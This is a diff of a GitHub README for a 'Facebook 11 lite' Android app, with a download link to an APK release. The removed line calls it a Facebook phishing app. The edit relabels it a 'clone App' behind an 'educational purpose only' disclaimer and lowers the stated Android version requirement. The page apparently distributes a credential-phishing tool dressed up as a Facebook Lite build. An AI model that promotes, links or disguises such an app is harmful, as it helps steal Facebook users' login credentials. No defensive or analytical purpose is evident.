@@ -3,7 +3,7 @@
 <h1 align=center>Facebook 11 lite</h1>
 <p align="center"> <img src="https://komarev.com/ghpvc/?username=cpfile&label=Total Facebook 11 lite %20download&color=0e75b6&style=flat" alt="cpfile" /> </p>
 
-#### Its An Fb Phsinig App. 
+#### Its An Fb 11 lite clone  App. 
 Remember :- This clone App Made For Educational Purpose Only. Don't Use Any Iligel Activity And Don't Harm Anyone. cyber protection will not be responsible if you use it for any unethical activity.
 <div align="center">
 
@@ -19,7 +19,7 @@ Remember :- This clone App Made For Educational Purpose Only. Don't Use Any Ilig
 
 ## Requirements
  - Android Phone
- - Version 6.0+
+ - Version 4.0+
  
  ## DOWNLOAD
  - <a href="https://github.com/cpfile/Facebook-11-lite-update-version-/releases/download/V2.0/Lite.2.apk">Facebook lite 02</a>
